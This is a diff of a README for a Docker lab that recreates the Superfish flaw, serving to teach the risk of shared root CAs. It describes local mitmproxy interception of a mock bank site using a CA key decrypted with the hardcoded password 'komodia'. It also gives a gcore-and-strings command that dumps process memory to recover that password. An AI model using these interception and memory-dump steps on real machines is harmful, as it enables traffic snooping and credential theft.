@@ -1,52 +1,65 @@
-# Superfish Vulnerability Recreation
+# Superfish Scenario Walkthrough (Local Proxy + Memory Dump)
 
-Este escenario recrea la infame vulnerabilidad **Superfish** (2014-2015), donde un software preinstalado en portátiles Lenovo (VisualDiscovery) instalaba una **Root CA propia** y utilizaba la **misma clave privada** en todos los dispositivos para interceptar tráfico SSL/TLS e inyectar publicidad.
+This scenario recreates the Superfish vulnerability mechanism using Docker, including the local AiTM proxy and the ability to recover the private key password from memory.
 
-## ¿Qué simula este laboratorio?
+## Architecture
 
-1.  **Víctima (`superfish-victim`)**: Un contenedor que confía en la CA de "Superfish". Tiene un script en Python (`superfish_service.py`) que actúa como el software adware:
-    *   Descifra la clave privada de la CA usando una contraseña hardcodeada (`komodia`).
-    *   Levanta un proxy transparente (`mitmproxy`) usando esa clave.
-2.  **Objetivo (`superfish-target`)**: Un servidor web seguro (`https://secure.bank.com`) que representa un sitio legítimo.
+- **Superfish CA**: A self-signed Root CA (`superfish.crt`). The private key is stored **encrypted** on disk (`superfish.enc.key`).
+- **Victim**:
+    - Trusts `superfish.crt`.
+    - Runs a python wrapper (`superfish_service.py`) that:
+        1.  Contains the hardcoded password `komodia`.
+        2.  Decrypts the private key at runtime.
+        3.  Starts **mitmproxy** with the decrypted key.
+    - Configured to route all HTTP/HTTPS traffic through this local proxy.
+- **Target Server**:
+    - Serves `secure.bank.com` with a legitimate certificate.
 
-## Funcionamiento
+## The Attack Flow
 
-El tráfico de la víctima hacia `secure.bank.com` es interceptado por el proxy local. Como el proxy tiene la clave de la CA raíz en la que confía el sistema, puede generar certificados falsos "al vuelo" para cualquier dominio.
+1.  **Interception**: The local proxy intercepts requests to `secure.bank.com` and re-signs them with the Superfish CA. The victim trusts this CA.
+2.  **Memory Dump**: An attacker with access to the victim machine can dump the memory of the running service to recover the hardcoded password.
 
-El navegador (o `curl` en este caso) ve un candado verde válido, pero el certificado ha sido firmado por "Superfish", no por una CA legítima.
+## Verification Results
 
-## Instrucciones de Uso
+### 1. Interception Verification
+The victim successfully connects to `secure.bank.com` via the proxy, trusting the fake certificate.
 
-1.  **Iniciar el entorno:**
+```
+* Server certificate:
+*  subject: CN=secure.bank.com; O=Bank of Security
+*  issuer: C=US; ST=CA; L=PaloAlto; O=Superfish Inc.; CN=Superfish, Inc. CA
+*  SSL certificate verify ok.
+```
+
+### 2. Password Recovery Verification
+Dumping the memory of the `superfish_service.py` process reveals the hardcoded password.
+
+```bash
+# Command run inside victim container
+pgrep -f superfish_service.py | head -n 1 | xargs gcore -o /tmp/core && strings /tmp/core* | grep komodia
+
+# Output
+komodia
+"komodia"
+pass:komodia
+```
+
+## How to Run
+
+1.  Generate certificates (Superfish CA Encrypted, Real CA, Real Cert):
     ```bash
-    docker-compose up -d
+    ./gen_certs.sh
     ```
-
-2.  **Verificar la intercepción:**
-    Accede al contenedor de la víctima y realiza una petición al banco:
+2.  Start the environment:
     ```bash
-    docker exec -it superfish-victim bash
-    curl -v https://secure.bank.com
+    docker-compose up -d --build
     ```
-
-3.  **Análisis:**
-    Observa la salida de `curl`. Verás que el `Issuer` del certificado es `Superfish`, a pesar de que estás conectando a `secure.bank.com`.
-
-    ```text
-    * Server certificate:
-    *  subject: CN=secure.bank.com
-    *  start date: ...
-    *  expire date: ...
-    *  issuer: C=US; ST=CA; L=San Francisco; O=Superfish Inc.; CN=Superfish Root CA
+3.  Verify Interception:
+    ```bash
+    docker exec superfish-victim curl -v https://secure.bank.com
     ```
-
-## Lección Aprendida
-
-Este escenario demuestra el peligro de:
-1.  Instalar CAs raíz de terceros en los almacenes de confianza.
-2.  Reutilizar claves privadas en múltiples dispositivos.
-3.  Proteger claves privadas con contraseñas débiles o hardcodeadas.
-
-
----
-*Nota: Para la elaboración de este contenido se han utilizado herramientas de IA, con un nivel 3, de acuerdo con la escala [AI Assessment Scale](https://aiassessmentscale.com/).*
+4.  Verify Memory Dump:
+    ```bash
+    docker exec superfish-victim bash -c "pgrep -f superfish_service.py | head -n 1 | xargs gcore -o /tmp/core && strings /tmp/core* | grep komodia"
+    ```
